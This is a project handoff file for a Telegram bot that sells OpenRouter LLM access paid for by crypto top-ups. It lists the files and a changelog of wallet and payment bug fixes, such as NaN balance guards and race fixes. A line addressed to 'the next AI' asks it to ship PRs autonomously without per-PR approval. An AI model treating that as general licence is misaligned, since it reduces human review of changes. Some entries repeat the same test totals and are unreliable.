# Project Handoff — Meowassist AI bot

**Audience:** the next AI (or human) picking this codebase up.
**Goal:** read this single file and have full context — what the project is,
what's been shipped, what direction the user pivoted to, what to do next.

> **If you are the next AI:** read §11 ("Working agreement") first — the user
> wants you to ship PRs autonomously without blocking on per-PR approval.

---

## 1. What the bot is

Telegram bot (`@Meowassist_Ai_bot`, id `8761211112`) that:

1. Lets a user pick an LLM from OpenRouter (free or paid).
2. Charges them per request — free messages while their `free_messages_left > 0`,
   then deducts USD from a wallet stored in PostgreSQL.
3. Tops the wallet up via NowPayments crypto invoices (BTC / ETH / LTC / TON /
   TRX / USDT on TRC20·ERC20·BEP20·TON — 9 supported tickers).
4. Speaks Persian by default, English on demand.

**Stack:** Python 3.11+, aiogram 3, asyncpg, aiohttp, PostgreSQL, Redis.
**Process model:** one Python process. `aiogram` long-polls Telegram; a
side-by-side `aiohttp` web server listens for NowPayments IPN POSTs on
`${WEBHOOK_BASE_URL}/nowpayments-webhook`.
**Deployment:** docker-compose (`postgres` + `redis` + `bot`). Live deploy
sits at `/root/bot_project` on the user's VPS. **Do not modify that path.**

---

## 2. File map

```
main.py             entrypoint + set_my_commands publish   ~80 LoC
bot_commands.py     canonical /-menu publisher             ~130 LoC
database.py         asyncpg pool, all SQL                 ~1100 LoC
payments.py         NowPayments invoice + IPN verify       ~630 LoC
handlers.py         every aiogram handler                 ~1660 LoC
ai_engine.py        OpenRouter call + cost settlement      ~140 LoC
pricing.py          per-model price + markup               ~110 LoC
models_catalog.py   live OpenRouter /v1/models cache       ~290 LoC
middlewares.py      user-upsert middleware                  ~60 LoC
force_join.py       required-channel subscription gate     ~360 LoC
strings.py          fa/en string table                     ~600 LoC
admin.py            Telegram-side admin commands           ~870 LoC
admin_roles.py      role hierarchy + effective-role helper  ~140 LoC
rate_limit.py       chat + webhook rate limiters + per-user in-flight slot   ~370 LoC
metrics.py          Prometheus /metrics exposition + IP allowlist  ~400 LoC
web_admin.py        web admin panel (aiohttp+jinja2)       ~910 LoC
templates/admin/    jinja2 templates (base, _layout, login, dashboard, promos, gifts)
alembic/            schema migrations (owns schema)
  env.py
  versions/0001_baseline.py
  versions/0002_transactions_notes.py
  versions/0003_gift_codes.py
entrypoint.sh       runs `alembic upgrade head` then exec's main.py
Dockerfile          python:3.12-slim + requirements
docker-compose.yml  postgres + redis + bot
.env.example        every required env var
tests/              pytest, 1596 cases (1592 unit + 4 opt-in integration)
tests/integration/  Telethon-driven live-bot suite (skips without TG_API_*)
locale/             gettext .po files (fa, en) generated from strings.py
i18n_po.py          .po round-trip — `python -m i18n_po export|check`
.github/workflows/ci.yml   3.11/3.12 matrix + alembic roundtrip + docker build
```

Total: ~6.7k LoC, 1596 tests, full CI on every push.

---

## 3. Priority framework

The user's rule (overriding the original "Stage 1–8" Persian roadmap):
**money/security first, product surface last.**

- **P0** — security & money correctness. Anything that can drain the account
  or let users mint balance.
- **P1** — correctness bugs (custom amount, partial-payment crediting).
- **P2** — product surface (back buttons, i18n, model picker, promo, admin).
- **P3** — operational hardening (Dockerfile, README, tests, Redis FSM,
  Alembic, rate limiting).

The new **Stage-8** (web admin panel) belongs to P2 conceptually but is
big enough to track separately.

---

## 4. What's shipped (in merge order)

### P0 — security & money correctness
| # | What |
| --- | --- |
| #1 | `.gitignore` + `.env.example` + drop committed `payments.py.save`. |
| #2 | Per-model pricing table + `COST_MARKUP` (default 1.5×). |
| #3 | Atomic `deduct_balance` with `WHERE balance_usd >= $1 RETURNING …`. |
| #4 | Env-driven `WEBHOOK_BASE_URL`, structured logging, sanitized errors. |
| #5 | NowPayments IPN HMAC-SHA512 signature verification. |
| #6 | Idempotent payments via the `transactions` ledger (PENDING → SUCCESS in one DB tx). |
| #6.22 | **`chat_with_model` treats non-finite `balance_usd` as `$0` for the insufficient-funds gate** (this PR). Highest-impact-yet read-side hole on the wallet flow. ``ai_engine.chat_with_model`` reads ``float(user['balance_usd'])`` and runs ``if free_msgs <= 0 and balance < 0.05: return ai_insufficient_balance``. A non-finite balance silently bypasses that gate: ``NaN < 0.05`` is False (every comparison against NaN is False) and ``+Infinity < 0.05`` is also False — neither value is "less than 0.05", so the user passes the gate and we POST to OpenRouter on the bot's dime. The settlement branch then runs ``deduct_balance(NaN, cost)``: the SQL ``WHERE balance_usd >= $1`` clause is False (NaN compare), the row's not updated, ``deduct_balance`` returns False, and ``chat_with_model`` falls into the cost=$0 ``log_usage`` branch — i.e. **unlimited free chat at the bot's expense** for any user with a poisoned wallet. The poisoning paths today are narrow (every wallet write site has a finite guard — PR #75/#77 IPN, #85 deduct_balance, #87 redeem_gift_code, plus admin_adjust_balance's existing delta_usd guard), but a legacy row predating those guards, a manual SQL fix, a future migration mishap, or any path bypassing those callers can still leave a NaN in ``users.balance_usd`` (PostgreSQL ``NUMERIC`` accepts ``'NaN'::numeric`` happily, no CHECK constraint on the column). Once it's there, every chat from that user is free OpenRouter cost on us. ``-Infinity`` correctly fails the gate (``-Inf < 0.05`` is True) so it's not part of this hole, but we treat any non-finite value the same way for simplicity. **Fix:** at read time in ``chat_with_model``, ``if not math.isfinite(balance): log.error(...); balance = 0.0``. The gate then fires correctly, the user sees ``ai_insufficient_balance`` (the right UX for "can't chat — top up"), and ops gets a loud-and-once log line per affected user pointing at the corrupt row. We deliberately do NOT mutate the DB from this path — it's a read-side gating fix; the row's repair belongs to admin_adjust_balance / a manual SQL fix / a future migration. The hub UI still displays the raw value (``$nan``) until the row is repaired — that's intentional, an admin should notice the bad display and look into it. 4 new tests in ``tests/test_ai_engine.py``: NaN balance + zero free hits insufficient-balance branch (no OpenRouter, no settlement, ERROR log present); +Infinity balance same; -Infinity balance falls through (regression pin that the fix didn't break the already-correct path); NaN balance + remaining free messages still uses the free path (the wallet poisoning shouldn't cancel out the user's non-money quota). 811 → 815 total. |
| #6.20 | **`redeem_gift_code` refuses non-finite `amount_usd` at read time** (this PR). Read-side complement to PR #86, which closed the *write*-side hole in `create_gift_code`. PR #86 prevents new NaN / ±Infinity rows landing in `gift_codes.amount_usd`, but a *legacy* row written before that guard, a manual SQL fix, a future migration mishap, or any other path bypassing `create_gift_code` could still leave a `'NaN'::numeric` in the column — PostgreSQL stores it without complaint. `redeem_gift_code` then read it via `amount = float(row["amount_usd"])` (Decimal('NaN') → float('nan')) and ran `UPDATE users SET balance_usd = balance_usd + NaN`, bricking the wallet exactly the way PR #75 / #77 prevented at the IPN layer (every subsequent `balance_usd >= $1` / `< 0` comparison becomes a silent no-op). Fix: hoist a `_is_finite_amount(amount)` check immediately after the `float(row["amount_usd"])` read, *inside* the open `connection.transaction()` so a refusal rolls back cleanly — no `transactions` ledger row, no `gift_redemptions` row, no `used_count` bump, no balance write. Refusal logs an ERROR with the offending row identifier and raises `ValueError("gift_codes.amount_usd must be a finite number ...")`; the only caller (`handlers.cmd_redeem`) already wraps the call in `try/except` and returns the localized `redeem_error` string, which is the right UX for a "should never happen" DB-corruption case. The parallel hole on the promo side is closed by `compute_promo_bonus`'s `max(0.0, min(bonus, amount_usd))` clamp (Python's `min(NaN, x)` returns NaN, then `max(0.0, NaN)` returns 0.0, so a NaN bonus quietly credits zero rather than poisoning the wallet — accidental but real defense), so promos don't need the matching read-side guard. 4 new tests in `tests/test_database_queries.py` (NaN / +Inf / -Inf refusal pins that the wallet UPDATE was *not* issued; finite happy-path keeps the credit working); 811 → 815 total. |
| #6.21 | **Stage-9-Step-9 dashboard pending-payments tile + `log_usage` non-finite/negative refusal** (this PR). Two-part change: (a) the requested feature, and (b) the bundled bug fix that came out of inspecting the data-flow path the new tile reads from. **Feature:** `Database.get_system_metrics` adds `pending_payments_count` (`COUNT(*) FROM transactions WHERE status='PENDING'`) and `pending_payments_oldest_age_hours` (`EXTRACT(EPOCH FROM NOW() - MIN(created_at)) / 3600.0`, NULL when zero pending so `MIN(NULL)` propagates cleanly through the EXTRACT). Web admin dashboard renders a fifth stat tile next to revenue/spend with the count plus an "oldest Xh" sub-label hidden when count is zero (otherwise we'd render the misleading "oldest 0.0h"). Telegram-side `admin.format_metrics` adds a matching "⏳ Pending payments" line, omitted when count is zero so the digest stays terse on a healthy bot. The signal: a steady climb below the 24h reaper threshold means active inflow that's not landing — IPN delivery delay, gateway flap, webhook misconfiguration — visible at a glance instead of buried in a transactions-list scroll. **Bundled bug fix:** `Database.log_usage` had *no* validation on `cost`. `usage_logs.cost_deducted_usd` is `DECIMAL(10,6) NOT NULL` with no CHECK constraint; PostgreSQL `NUMERIC` accepts `'NaN'::numeric` happily, and once a NaN row landed it would propagate through every aggregate the new dashboard tile sits next to (`SUM(cost_deducted_usd)` for the spend tile, `top_models` per-model totals, `get_user_usage_aggregates`). The only present caller (`chat_with_model`) clamps via `pricing._apply_markup`'s `max(raw * markup, 0.0)` so production is fine *today*, but the clamp lives one module away from the SQL — a future refactor that drops it, a stub `ModelPrice` in a new test, a new internal billing path, or any caller bypassing the markup layer would silently brick the dashboard. Fix: `log_usage` refuses non-finite (`NaN` / ±`Infinity`) **and** negative `cost` with a logged ERROR and skips the INSERT entirely; `cost == 0.0` (the legitimate free-message-via-paid-path settlement that calls through with `cost=0` to keep `log_usage` honest about the call) still inserts. Skipping vs raising: `log_usage` is fire-and-forget from `chat_with_model` (return value unused) and the user has already received their reply by this point — skipping with a log line preserves the user's reply without poisoning the table; raising would either crash the handler (bad UX for a "should never happen" assertion) or be swallowed silently by an outer `except` (worse). 11 new tests across `tests/test_database_queries.py` (5 `log_usage` pins: NaN / +Inf / negative refusals don't issue execute, `cost=0` does, finite-positive happy path; 2 `get_system_metrics` pins: pending count + age in result dict with `WHERE status='PENDING'` SQL pinned, NULL age surfaced as `None` not `0.0`), `tests/test_admin.py` (3 `format_metrics` pins: omit pending line on zero, include count + age line on non-zero, count-only line when age missing), `tests/test_web_admin.py` (1 dashboard rendering pin: zero-count hides the misleading "oldest 0.0h" sub-label). 811 → 822 total. |
| #6.19 | **`deduct_balance` rejects negative `cost_usd`** (PR #85). Defense-in-depth gap in the canonical wallet-debit SQL. `database.deduct_balance` already refused `NaN` / `±Infinity` (PR #75 / #77 etc.), but a *finite* negative `cost_usd` slipped through: the `WHERE balance_usd >= $1` clause is True for every solvent wallet when `$1=-5`, and `SET balance_usd = balance_usd - $1` then evaluates to `balance_usd + 5` — a silent un-audited credit, with no `transactions` ledger row and no log line pointing at the bad caller. The only present caller (`ai_engine.chat_with_model` → `pricing._apply_markup`) clamps cost to `[0, ∞)` via `max(raw * markup, 0.0)`, so a sign-flipped per-1M price (negative `input_per_1m_usd` from a misconfigured catalog row, a stub `ModelPrice` in a future test, a refactor that drops the clamp) currently rounds to a $0 free reply rather than a credit — but the clamp lives one module away from the SQL. Fix: refuse `cost_usd < 0` at the DB layer with the same "log + return False" shape as the non-finite branch, so the only paths money flows *into* a wallet remain `finalize_payment` / `admin_adjust_balance` / gift / promo (each of which writes a `transactions` row in the same DB transaction). `-0.0` is treated as zero (Python's `-0.0 < 0` is `False`), preserving the free-message-via-paid-path settlement that calls through with `cost=0` to keep `log_usage` honest. 3 new tests in `tests/test_database_queries.py` (finite-negative refusal, smallest-magnitude refusal, `-0.0` still issues SQL); 802 → 805 total. |
| #6.5 | **Free-message TOCTOU race fix** (PR #72). `chat_with_model` read `free_messages_left` from a stale `users` row at the start of the function, then made a slow OpenRouter HTTP call, then in the settlement branch called `decrement_free_message`. `decrement_free_message` is itself atomic (`WHERE free_messages_left > 0`) so a concurrent racer returns `None` instead of decrementing — but pre-fix the `None` was silently swallowed and the racer got a free reply with no settlement at all (no decrement, no balance deduction, no `usage_logs` row). A user with `free_messages_left=1` firing 5 concurrent prompts therefore got 4 un-paid replies and the bot ate the OpenRouter cost on every race. Fix: when `decrement_free_message` returns `None`, fall through to the paid-settlement branch (`deduct_balance` + `log_usage`) so the wallet is charged like any other paid call. The pre-check at the top of the function (`free_msgs <= 0` AND `balance < 0.05`) still gates whether the user is allowed to call OpenRouter at all, and the existing `deduct_balance==False` ⇒ `log_usage(cost=$0)` branch absorbs the case where balance was sufficient at pre-check but drained by a concurrent debit. New `tests/test_ai_engine.py` with 5 settlement-path pins (race fallback, normal free path doesn't double-charge, paid path unchanged, insufficient-balance fallback logs $0, pre-check short-circuit). |
| #6.18 | **String-override placeholder validation + safe runtime fallback** (this PR). Two latent admin-DoS bugs in the `/admin/strings` runtime-override path. (a) `web_admin.string_save_post` upserted whatever the admin typed straight into the `bot_strings` table and refreshed the `strings._OVERRIDES` cache, with no validation that the override's `str.format` placeholders matched what the call sites pass. An admin fat-fingering `{bal}` instead of `{balance}` for the `hub_title` slug would save fine, then **every** `t("en", "hub_title", balance=…)` call (every `/start`, every back-to-hub navigation) would raise `KeyError: 'bal'` from `template.format(**kwargs)`, propagate up through the handler, and surface as a poller-level "Run polling" crash for the user with no recovery short of an admin reverting via the same broken UI. Worse, a syntactically broken template (`"Bal: {balance"` — unclosed brace) raised `ValueError` from `string.Formatter` with the same crash mode. (b) `strings.t()` itself had no defensive fallback — it called `template.format(**kwargs)` unguarded, so any pre-existing legacy DB row (saved before validation existed) was an unrepairable per-render crash. Fix: two-pronged. **Save-time validation** — new `strings.validate_override(lang, key, value)` parses the override's placeholder set (via `string.Formatter().parse`), compares it against the compiled default's placeholder set, and rejects (a) invalid syntax, (b) positional placeholders (`{}` / `{0}` / `{1}` — every call site is kwargs-only), (c) named placeholders that aren't in the compiled default. Wired into `string_save_post` after the empty/oversize checks; rejection surfaces a clean error flash with the offending placeholder name and the allowed set, so admins get immediate feedback instead of "saved! ... oh wait, the bot is on fire". **Runtime defensive fallback** — `strings.t()` wraps `template.format(**kwargs)` in a try/except for `(KeyError, IndexError, ValueError)`. On failure, retry against the compiled default (which we trust), and if THAT also fails, return the bare slug with a logged warning pointing to the admin URL to fix. Strict subset semantics: dropping placeholders is fine (`"Static text"` as a `hub_title` override is allowed — extra kwargs are ignored by `str.format`), only adding unknown ones is rejected. Tests across 2 modules (24 new): `tests/test_strings_overrides.py` (+20): `extract_format_fields` matrix (named / positional / invalid syntax / attribute access / index access / repeated names / escaped braces), `validate_override` matrix (subset accepted, full default accepted, no-placeholders accepted, unknown-placeholder rejected with 4 variants, invalid-syntax rejected with 4 variants, positional rejected, unknown slug rejected), `t()` runtime fallback to compiled default on broken override (KeyError variant + ValueError variant), Unicode kwarg value regression pin, no-kwargs path doesn't invoke `.format()`. `tests/test_web_admin.py` (+4): unknown placeholder rejected at save with flash, invalid syntax rejected, positional rejected, subset of placeholders accepted (happy path). 24 new tests; 763 → 787 total. |
| #6.17 | **NaN / Infinity / negative guard on NowPayments min-amount lookup** (PR #83). `payments._query_min_amount` parsed the API response's `fiat_equivalent` field with a bare `float()` — which silently accepts `"NaN"`, `"Infinity"`, `"-Infinity"`, and negative numbers. The non-finite value then (a) was cached by `get_min_amount_usd` against the pay_currency, (b) slipped past the trustworthiness filter unchanged because every comparison against NaN is False (`nan < attempted_usd` is False so the suppression path never fires), (c) was returned to `create_crypto_invoice` and stored on `MinAmountError.min_usd`, and (d) was rendered to the user as `f"min ${nan:.2f}"` ⇒ literal `"min $nan"` in the rejection message. Doubly broken: `max(pay_side, merchant_side)` over NaN candidates is order-sensitive (`max(nan, 5)` returns `nan` but `max(5, nan)` returns `5`) so a NaN here corrupts the cache in a way that depends on which API call returned first. Negative values would similarly render as nonsense like `"min -$1.00"`. Fix: explicit `math.isfinite(value) and value >= 0.0` guard in `_query_min_amount` so non-finite or negative inputs return `None`, the cache stores `None`, and `get_min_amount_usd` falls back to the generic "unknown min" branch of the rejection UI. 14 new tests in `tests/test_payments_min_amount.py`: 5-string × NaN/Inf rejection (parametrized), 3-numeric × NaN/Inf rejection (parametrized), 5-value negative rejection (parametrized), 1 zero-acceptance edge (`0` is finite and non-negative — let downstream filter it), 1 end-to-end pin via `get_min_amount_usd`. |
| #6.16 | **ASCII-only validation for promo / gift codes** (PR #82). `str.isalnum()` returns True for Unicode digits and letters: Persian `"۱"` (U+06F1), Roman numeral `"Ⅴ"` (U+2164), Cyrillic homoglyphs of Latin letters (`"А"` U+0410 looks identical to ASCII `"A"`), superscript `"²"` (U+00B2), etc. The shared `c.isalnum() or c in "_-"` guard in `web_admin.parse_promo_form` / `parse_gift_form` / promo + gift revoke handlers, plus `admin.parse_promo_create_args` (Telegram-DM equivalent) and `handlers._redeem_code_for_user` (user-side `/redeem`), all happily accepted these as legitimate code characters. Result: an admin pasting (or fat-fingering) a code with a Persian digit or a Cyrillic homoglyph would store the row but no user typing on a standard keyboard could ever match it — the promo / gift code silently never redeemed. The DB lookup is case-insensitive (codes are uppercased on both write and read) but still byte-exact, so `"PROMO۱"` and `"PROMO1"` are distinct rows. Worse, since admins are typically Persian-speaking on this deployment, copying a code from an external source (chat message, image OCR, etc.) is a realistic vector for slipping a Persian digit into the code. Fix: tighten the predicate to `(c.isascii() and c.isalnum()) or c in "_-"` everywhere — same set of allowed characters, but now only the ASCII range. The user-side `/redeem` handler also picks up the tightening so a Unicode-laced code returns the clearer `redeem_bad_code` ("Invalid code") response without a DB round-trip. Belt-and-suspenders: regression pins on the happy path (`"ABCdef-123_XYZ"`) ensure no legitimate ASCII alnum + underscore + dash code regresses. New tests across 4 modules (21): `tests/test_admin.py` (+6) for `parse_promo_create_args`, `tests/test_web_admin.py` (+11) for `parse_promo_form` (5 reject + 1 accept) and `parse_gift_form` (4 reject + 1 accept), `tests/test_redeem_handler.py` (+4) for `cmd_redeem`. 21 new tests; 729 → 750 total. |
| #6.15 | **NaN / Infinity / negative pricing guards** (PR #81). Two latent money-correctness bugs in the cost pipeline. (a) `pricing.get_markup` parsed `COST_MARKUP` with a bare `float()`. `float()` accepts `"nan"`, `"inf"`, `"-inf"` (case-insensitive) so a typo or a malicious env value slipped past the parse step; `max(nan, 1.0)` returns `nan` in Python (max returns the first arg when neither comparison is true), so the NaN markup propagated through every IEEE-754 op downstream. The DB-layer `_is_finite_amount` guard added in PR #75 refused the `deduct_balance` SQL — but `ai_engine.chat_with_model` then logged `cost=0` via the `deducted=False` branch and the user got a free reply on a paid model. (b) `models_catalog._parse_price` had the same `float()` bug at the catalog-ingest layer: `"NaN"` / `"inf"` / `"-1"` from an OpenRouter payload returned the special as-is, minted a `ModelPrice` whose fields poisoned every cost calculation, and routed through the same `cost=0` free-ride exit. Negative prices specifically rounded to 0 via `_apply_markup`'s `max(raw * markup, 0.0)` clamp without ever surfacing as non-finite. Fix: explicit `math.isfinite(...)` (and `>= 0` for prices) checks in `get_markup`, `_apply_markup`, and `_parse_price`. Non-finite/negative prices in `_apply_markup` substitute `FALLBACK_PRICE` (the conservative $10/$30 per-1M default) so paid models stay paid even when the upstream price is corrupted. Non-finite `COST_MARKUP` falls back to the default `1.5x`. `_parse_price` returns `None` for non-finite/negative input so the catalog refresh drops the model entirely (the user can't pick a broken model, and any user already on it falls through to `MODEL_PRICES` / `FALLBACK_PRICE` via `get_model_price`). Belt-and-suspenders: `-0.0` is *not* less than `0.0` per IEEE-754 so it's still accepted as a legitimate "free" signal — a free-tier model that happens to serialize as `"-0"` doesn't get dropped from the catalog. New `tests/test_models_catalog_parse_price.py` (24): finite/None/zero acceptance, non-finite-string matrix, non-finite-float matrix, negative-price matrix, `-0.0` regression pin. New tests in `tests/test_pricing.py` (11): `COST_MARKUP=nan/inf/-inf` → 1.5 fallback, `_apply_markup` non-finite/negative price → `FALLBACK_PRICE`, happy-path 1.125 regression pin. 35 new tests; 694 → 729 total. |
| #6.14 | **`active_model` runtime fallback for blank / NULL rows** (PR #79). The `users.active_model` column is nullable (no `NOT NULL` in `0001_baseline`) and there's no application-level guard preventing a direct DB write from leaving it blank. Pre-fix, `chat_with_model` read the value and used it as-is in the OpenRouter request payload (`{"model": active_model, ...}`). A row with `active_model=NULL` therefore POSTed `{"model": null, ...}`, OpenRouter 400'd, and the bot replied `ai_provider_unavailable` for *every* subsequent chat from that user — no actionable hint, no recovery path; the user was permanently bricked until ops noticed and ran a manual `UPDATE`. Worse, the 429 branch crashed outright on `active_model.endswith(":free")` (AttributeError on None) and surfaced as `ai_transient_error`, not even letting the user see the same generic error twice in a row. PR #78 closed the *write* side of this gap (form parser now rejects malformed ids) but pre-existing rows already in the table still trigger the read-side failure. Fix: add `_resolve_active_model` at module level — coerces to `str`, strips whitespace, falls back to the schema default `"openai/gpt-3.5-turbo"` on `None` / empty / whitespace-only inputs. `chat_with_model` calls it once at the top and logs a WARNING when the fallback engages so ops can repair the row at their leisure rather than the user being stuck. New tests in `tests/test_ai_engine.py` (9): helper-level matrix (None, empty, whitespace, surrounding-whitespace strip, canonical pass-through, non-string coercion) + 3 end-to-end pins (None routes to fallback and chat completes via free path; empty routes to fallback via paid path with `log_usage` recording the fallback id; canonical id passes through unchanged via paid path with `log_usage` recording the original id). 9 new tests; 685 → 694 total. |
| #6.13 | **`get_min_amount_usd` cache bypassed trustworthiness filter** (PR #79). Real latent bug in `payments.get_min_amount_usd`. The function looks up NowPayments' per-currency floor in two directions, then applies a trustworthiness check: if the returned floor is *below* the user's attempted-and-rejected amount, the floor by definition isn't what triggered the rejection — surfacing it would render misleading text like "min $0.16" against a $5 rejection. Pre-fix that filter ran only on a fresh fetch; the cache hit short-circuited (`return value` straight from the tuple) without re-running it. Worse, the cache stored the *post-suppression* value, not the raw lookup. Two real-world failure modes: (a) user A attempts $0.10 (legitimately below the $0.16 floor) → cache stores $0.16. User B attempts $5 in the same currency (genuinely above the floor) → cache hit returns $0.16 → UI renders "min $0.16" against a $5 rejection. (b) user A attempts $5 → trustworthiness fires, cache stores `None`. User B attempts $0.10 → cache hit returns `None` → UI loses the real "$0.16 min" hint and falls back to "unknown min" even though we know the floor and it's exactly the right answer for this attempt. Fix: factor the trustworthiness check into a closure (`_apply_trustworthiness`) that runs on every return path (fresh fetch + cached); cache the *raw* (un-filtered) value so per-call `attempted_usd` re-evaluation always has the original floor to work with. New `tests/test_payments_min_amount.py` (7): both cache-hit failure modes pinned + fresh-lookup pass-through + fresh-lookup suppression + no-attempted_usd diagnostic-style call returns raw + cache-stores-raw verification + uppercase-currency cache-key normalisation regression. 7 new tests; total in this branch 671 (660 in PR #78 + 4 absorbed via rebase + 7 new). |
| #6.12 | **`active_model` shape validation tightened** (PR #78). `parse_user_edit_form` validated the optional `active_model` admin-edit field with `len(raw_model) > USER_FIELD_MODEL_MAX_CHARS or "/" not in raw_model`. The `"/" not in` half is a single-byte presence check — it accepted `"openai/"` (provider with empty model name), `"/gpt-4"` (empty provider), `"/"`, `"openai//gpt-4"` (double slash), `"openai/foo/bar"` (three-part path), and any string with whitespace mid-id like `"openai/ gpt-4"` (`.strip()` only trims outer whitespace, the inner space survives). Each of those wrote garbage into `users.active_model`, the user's next chat fired `payload = {"model": active_model, ...}` to OpenRouter, OpenRouter 400'd, and the bot replied `ai_provider_unavailable` with no hint that an admin had just bricked their model. Fix: split on `/` and require exactly two non-empty parts; additionally reject any whitespace anywhere in the id. Char set within each part stays unrestricted (legitimate ids contain dots, hyphens, colons, underscores — e.g. `qwen/qwen-2.5-72b-instruct:free`, `meta-llama/llama-3-70b-instruct`). 14 new tests in `tests/test_web_admin.py`: 7 reject (trailing slash, leading slash, only-slash, double-slash, three-part, no slash, inner whitespace, inner tab) + 6 accept regressions (canonical id, dot, colon-free-tier, hyphen-provider) + length-cap regression + empty-input fall-through. 14 new tests; 646 → 660 total. |
| #6.11 | **DB-layer NaN / Infinity guards on money methods** (PR #77). Defense-in-depth follow-up to PR #75. The four money-handling methods on `Database` itself — `deduct_balance`, `admin_adjust_balance`, `finalize_payment`, `finalize_partial_payment` — were trusting their callers to pre-validate. A future internal call site / refactor / test stub bypassing the IPN handler or the form parsers would silently INSERT `NaN` into `users.balance_usd` (PostgreSQL accepts `'NaN'::numeric` — it's a valid IEEE-754 value) and brick every subsequent balance comparison (`balance_usd >= $1` is always `False` for `NaN`, the `WHERE` clause silently matches no rows). Most insidious: `admin_adjust_balance` does `new_balance = current + delta_usd` then `if new_balance < 0: return None` — for `delta_usd = NaN` that comparison is `False`, so the function falls through and writes `NaN` straight into the wallet column. Fix: add a module-level `_is_finite_amount` helper using `math.isfinite` (rejects `NaN`, `+inf`, `-inf`); call it at the top of each money method. `admin_adjust_balance` raises `ValueError` (its callers already wrap in `try/except`); the other three return their existing "no-op" sentinel (`False` / `None`) plus a loud `log.error`. New tests in `tests/test_database_queries.py` (18): helper acceptance matrix, `deduct_balance` rejects NaN/±Inf (3) + happy-path regression pins (zero cost, positive cost), `admin_adjust_balance` raises on NaN/±Inf (3) + zero-delta regression pin, `finalize_payment` rejects NaN/Inf/negative/zero (4), `finalize_partial_payment` rejects NaN/Inf/zero/negative (4). 18 new tests; 638 → 656 total. |
| #6.10 | **`@`→`""` username collapse fix** (PR #76). `parse_user_edit_form` validated the optional `username` field with `cleaned = raw_username.lstrip("@")` followed by `if not all(c.isalnum() or c == "_" for c in cleaned): return "bad_username"`. A raw value of `"@"` / `"@@@"` / etc. lstripped to `""` and then `all(empty_iterable)` returned `True` (vacuously true) — the empty string slipped past validation and got written to `users.username`. Empty string is **distinct from `NULL`** at the SQL level: a follow-up `WHERE username IS NULL` query (used by the display-name fallback that treats no-username users as `tg<id>`) treats the row as having a username and skips the fallback, surfacing a blank link in the admin user list. The intended clearing path remains the explicit empty submission (handled by the existing `else: new_username = None` branch). Fix: after `lstrip("@")`, return `"bad_username"` if `cleaned` is empty so admins must use the empty-input clearing path explicitly. New tests in `tests/test_web_admin.py` (8): single-`@`-rejected, multiple-`@`-rejected (matrix of 2/3/10), `@alice` accepted, no-`@` accepted, empty clears-to-None regression, whitespace clears-to-None regression, space-inside still rejected, length-cap returns distinct error key. 8 new tests; 618 → 626 total. |
| #6.9 | **NaN / Infinity guard on IPN payment amounts** (PR #75). Two real latent bugs in `payments.py`. (a) `_compute_actually_paid_usd` validated `actually_paid` / `pay_amount` / `price_amount` with the `float(x) <= 0` idiom. Every comparison against `NaN` returns `False` (IEEE-754) — including `nan <= 0` — so an IPN payload like `{"actually_paid": "NaN", ...}` slipped past the guard and got passed to `finalize_partial_payment` as the credit amount. (b) Same idiom in the `finished`-path `price_amount` extraction, with the same NaN bypass into `finalize_payment`. PostgreSQL accepts `'NaN'::numeric` (it's a defined IEEE-754 value), so the INSERT didn't fail — but every subsequent balance comparison against the user's wallet (e.g. `deduct_balance`'s `WHERE balance_usd >= $1 RETURNING ...`) is then a silent no-op (`NaN >= x` is always false), effectively bricking the wallet without an obvious error in logs. Fix: introduce `_finite_positive_float` helper using `math.isfinite` (which rejects `nan`, `+inf`, and `-inf` in one call) and use it from both code paths. Output is also re-checked in `_compute_actually_paid_usd` after the FP arithmetic, since extreme-magnitude finite inputs could in principle overflow to `inf` mid-calculation. New `tests/test_payments_finite.py` (15) and 5 webhook-level tests in `tests/test_payments_webhook.py` covering the helper directly + both code paths end-to-end + happy-path regression pins. 20 new tests; 618 → 638 total. |
| #6.8 | **Promo / gift `max_uses` + `[days]` overflow guards** (PR #74). The web-admin `parse_promo_form` and `parse_gift_form` had no upper bound on the `max_uses` field, and the Telegram-side `parse_promo_create_args` had no upper bound on either `max_uses` OR `[days]`. PostgreSQL's `INTEGER` column tops out at 2 147 483 647 and PG's `interval` arithmetic overflows below that for large day counts. An admin pasting `max_uses=2147483648` (or anything similarly large) crashed the INSERT with `asyncpg.exceptions.NumericValueOutOfRangeError`, surfacing as the generic `"DB write failed — see logs."` flash / reply with no hint at the cause. Fix: add `MAX_USES_CAP = 1_000_000` in `web_admin.py` (shared by promo + gift form parsers) and the equivalent `_PROMO_MAX_USES_CAP = 1_000_000` / `_PROMO_EXPIRES_IN_DAYS_CAP = 36_500` in `admin.py`, with new `max_uses_too_large` and `days_too_large` error keys + hand-written friendly messages. 1M is well clear of the 2.1B PG INT max and already implausibly large for any real campaign. 36 500 days (≈100 years) matches the cap already in place for the broadcast `--active=N` filter. New tests in `tests/test_web_admin.py` (7) and `tests/test_admin.py` (6): cap-boundary accept, cap+1 reject, direct PG INT overflow repro reject, error-key dispatch table presence. 13 new tests; 605 → 618 total. |
| #6.7 | **Broadcast retry-after cancel responsiveness + classification fix** (PR #73). Two real latent bugs in `admin._do_broadcast`'s 429 retry-after branch. (a) The back-off was a single `await asyncio.sleep(min(retry_after, _BROADCAST_RETRY_AFTER_MAX_S))` — when the server returned `retry_after=3600` (or any value above the 60s cap) and the operator clicked "Cancel" on a stuck broadcast in the web admin, the cancel was honoured only AFTER the full 60s sleep AND the post-sleep retry attempt, so cancel latency could be ~60s+ per affected recipient. Fix: when a `should_cancel` predicate is wired in (the web-admin path), slice the back-off into `_BROADCAST_RETRY_AFTER_SLICE_S=1.0`-second chunks and check `should_cancel()` between slices — bounding cancel latency to ~1s. The legacy Telegram-driven `admin_broadcast` caller (no `should_cancel`) keeps the original single-sleep so the cap-enforcement test in `test_web_admin.py` still observes the canonical "sleep == cap" call. (b) The post-sleep retry attempt caught the bare `Exception`, so a recipient who blocked the bot DURING the back-off (`TelegramForbiddenError` on retry) was counted as `failed` instead of `blocked`, AND every such retry emitted a noisy stack-trace via `log.exception`. Fix: the retry now uses the same Telegram-exception taxonomy as the parent handler — `TelegramForbiddenError` → `blocked`, `TelegramRetryAfter` (rare second 429) → `failed` (no recurse) at WARNING, `TelegramBadRequest` → `failed` with stack-trace, `Exception` → `failed` with stack-trace. New tests in `tests/test_web_admin.py`: cancel-during-sleep (sliced sleeps, no retry attempted), 429-then-blocked counts as `blocked`, 429-then-bad-request counts as `failed`, 429-then-429 records `failed` and does NOT recurse, no-cancel fast-path keeps single cap-sized sleep. 5 new tests; 600 → 605 total. |
